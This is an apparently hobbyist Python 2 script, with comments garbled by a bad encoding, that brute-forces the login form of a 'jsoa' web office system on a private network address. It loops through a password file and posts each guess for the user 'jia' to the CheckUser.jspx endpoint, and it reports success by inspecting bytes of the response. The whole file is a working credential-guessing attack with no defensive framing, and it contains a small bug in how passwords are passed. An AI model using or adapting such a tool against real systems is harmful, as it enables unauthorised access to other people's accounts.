#!/usr/bin/python

#-*-coding:utf-8-*-

import sys
import httplib,urllib;  #����ģ��

def PassParse(username,passwd):

# ���б��ύ  С��  2014-01-20         
#������Ҫ���з��͵�����
    params = urllib.urlencode({'pwdError':0,     
                               'userName':username,
                               'userPassword':passwd
                               });     
#����һЩ�ļ�ͷ
    headers = {"Content-Type":"application/x-www-form-urlencoded",      
           "Connection":"Keep-Alive","Referer":"http://192.168.1.170:8000/jsoa/login.jsp?error=serverdown",
            "Accept-Language": "zh-CN",
            "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET4.0C; .NET4.0E)",
            "Accept": "application/x-ms-application, image/jpeg, application/xaml+xml, image/gif, image/pjpeg, application/x-ms-xbap, application/vnd.ms-excel, */*",
            "Accept-Encoding": "gzip, deflate",
            "cookie":"JSESSIONID=2F3E4882AEA5E2A3F38A69B424AA07CC; jsoaUserName=jia"};     
#����վ����һ������    
    conn = httplib.HTTPConnection("192.168.1.170","8000");     
#��ʼ���������ύ   ͬʱҲ����ʹ��get����    
    conn.request(method="POST",url="/jsoa/CheckUser.jspx",body=params,headers=headers);     
#���ش���������    
    response = conn.getresponse();     
#�ж��Ƿ��ύ�ɹ�    
    if response.status == 200:     
        body = response.read()
        #print len(body)
        #ord()
        #int()
        print "%s,%s" % (body[8].encode(encoding="hex"),body[9].encode(encoding="hex"))
        if body[10].encode(encoding="hex")=="ad" and body[11].encode(encoding="hex") == "58":
            print "succ!^_^!";
            print "pass is : ",passwd
        else:
            print "fail"
        #print ("%x,%x,%x" %(byte(body[1]),byte(body[2]),byte(body[3])))
    else:     
        print "fail\^0^/";     
#�ر�����    
    conn.close();  


def getPass():
    fp = open('pass1.txt', 'r')
    if fp == 0:
        print "open file error!"
        exit()
    try:
        fp_obj = fp.readlines()
    except ValueError:
        print "read file error!"
    for line in fp_obj:
        passwd = line.split()
        PassParse("jia",passwd)
        #print passwd[0]

getPass()        